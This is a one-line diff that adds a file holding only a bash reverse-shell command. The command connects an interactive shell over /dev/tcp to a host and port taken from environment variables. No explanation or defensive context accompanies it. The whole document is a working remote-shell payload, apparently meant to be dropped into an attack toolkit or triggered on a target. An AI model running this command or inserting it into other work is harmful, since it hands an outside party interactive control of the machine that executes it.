@@ -1,0 +1,1 @@
+bash -c 'bash -i >& /dev/tcp/${JJ_LHOST}/${JJ_LPORT} 0>&1'
